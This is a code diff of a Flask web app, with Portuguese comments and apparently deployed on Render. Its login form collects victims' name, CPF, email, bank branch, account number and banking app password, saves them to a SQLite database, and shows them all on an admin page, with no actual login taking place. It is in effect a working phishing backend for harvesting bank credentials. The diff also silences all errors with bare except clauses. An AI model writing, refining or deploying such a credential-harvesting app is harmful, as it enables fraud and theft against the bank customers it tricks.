@@ -4,22 +4,17 @@ from flask import Flask, render_template, request, redirect, url_for
 
 app = Flask(__name__)
 
-# Função para criar o banco sem travar o site
+# Função simplificada para não travar o deploy
 def init_db():
     try:
         conn = sqlite3.connect('dados_bancarios.db')
         cursor = conn.cursor()
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS usuarios (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                nome TEXT, cpf TEXT, email TEXT,
-                agencia TEXT, conta TEXT, senha_app TEXT
-            )
-        ''')
+        cursor.execute('''CREATE TABLE IF NOT EXISTS usuarios 
+            (id INTEGER PRIMARY KEY AUTOINCREMENT, nome TEXT, cpf TEXT, email TEXT, agencia TEXT, conta TEXT, senha_app TEXT)''')
         conn.commit()
         conn.close()
-    except Exception as e:
-        print(f"Erro ao iniciar banco: {e}")
+    except:
+        pass
 
 @app.route('/')
 def index():
@@ -28,22 +23,17 @@ def index():
 @app.route('/login', methods=['POST'])
 def login():
     try:
-        nome = request.form.get('nome')
-        cpf = request.form.get('cpf')
-        email = request.form.get('email')
-        agencia = request.form.get('agencia')
-        conta = request.form.get('conta')
-        senha = request.form.get('senha_app')
-
+        nome, cpf, email = request.form.get('nome'), request.form.get('cpf'), request.form.get('email')
+        ag, cc, pw = request.form.get('agencia'), request.form.get('conta'), request.form.get('senha_app')
+        
         conn = sqlite3.connect('dados_bancarios.db')
         cursor = conn.cursor()
-        cursor.execute('''INSERT INTO usuarios (nome, cpf, email, agencia, conta, senha_app) 
-                          VALUES (?, ?, ?, ?, ?, ?)''', (nome, cpf, email, agencia, conta, senha))
+        cursor.execute('INSERT INTO usuarios (nome, cpf, email, agencia, conta, senha_app) VALUES (?,?,?,?,?,?)', 
+                       (nome, cpf, email, ag, cc, pw))
         conn.commit()
         conn.close()
-    except Exception as e:
-        print(f"Erro ao salvar: {e}")
-    
+    except:
+        pass
     return redirect(url_for('sucesso'))
 
 @app.route('/sucesso')
@@ -60,11 +50,12 @@ def admin():
         conn.close()
         return render_template('admin.html', usuarios=usuarios)
     except:
-        return "Painel temporariamente indisponível."
+        return "Erro ao carregar dados."
 
 if __name__ == '__main__':
     init_db()
-    port = int(os.environ.get("PORT", 10000))
+    # O Render precisa da porta definida pela variável de ambiente
+    port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
 
 
